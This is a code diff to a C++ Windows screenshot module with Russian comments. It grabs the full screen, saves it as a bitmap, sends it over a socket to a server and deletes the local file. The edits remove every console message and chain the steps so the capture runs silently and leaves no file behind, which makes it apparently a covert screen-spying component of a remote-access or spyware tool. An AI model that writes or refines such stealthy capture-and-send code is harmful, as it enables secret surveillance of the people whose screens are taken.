@@ -1,3 +1,4 @@
+
 #include "screenshot.h"
 #include <cstdio>
 
@@ -66,7 +67,7 @@ int SaveBitmapToFile(HBITMAP hBitmap, const char* fileName) {
 int SendFileOverSocket(SOCKET clientSocket, const char* filePath) {
     std::ifstream file(filePath, std::ios::binary);
     if (!file) {
-        std::cerr << "Ошибка при открытии файла." << std::endl;
+        // "Ошибка при открытии файла." 
         return -1;
     }
 
@@ -88,12 +89,11 @@ int SendFileOverSocket(SOCKET clientSocket, const char* filePath) {
     return 0;
 }
 
-
 int CaptureScreenshot(SOCKET clientSocket) {
     HDC hdcScreen = GetDC(NULL);
 
     if (!hdcScreen) {
-        std::cerr << "Ошибка при получении дескриптора экрана." << std::endl;
+        // Обработка ошибок при получении дескриптора экрана
         return -1;
     }
 
@@ -106,26 +106,31 @@ int CaptureScreenshot(SOCKET clientSocket) {
     BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
 
     if (SaveBitmapToFile(hBitmap, "screenshot.bmp") == 0) {
-        std::cout << "Скриншот успешно сохранен в файл 'screenshot.bmp'." << std::endl;
+        // Отправка скриншота на сервер
+        if (SendFileOverSocket(clientSocket, "screenshot.bmp") == 0) {
+            // Удаление временного файла
+            if (std::remove("screenshot.bmp") == 0) {
+                // Все операции завершились успешно
+                DeleteObject(hBitmap);
+                DeleteDC(hdcMem);
+                ReleaseDC(NULL, hdcScreen);
+                return 0;
+            }
+            else {
+                // Обработка ошибок при удалении файла
+            }
+        }
+        else {
+            // Обработка ошибок при отправке файла
+        }
     }
     else {
-        std::cerr << "Ошибка при сохранении скриншота." << std::endl;
-    }
-    if (SendFileOverSocket(clientSocket, "screenshot.bmp") == 0) {
-        std::cout << "Файл успешно отправлен на сервер." << std::endl;
-    }
-    else {
-        std::cerr << "Ошибка при отправке файла." << std::endl;
-    }
-
-    if (std::remove("screenshot.bmp") == 0) {
-        std::cout << "Файл успешно удален." << std::endl;
-    }
-    else {
-        std::cerr << "Ошибка при удалении файла." << std::endl;
+        // Обработка ошибок при сохранении скриншота
     }
 
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
+
+    return -1;
 }
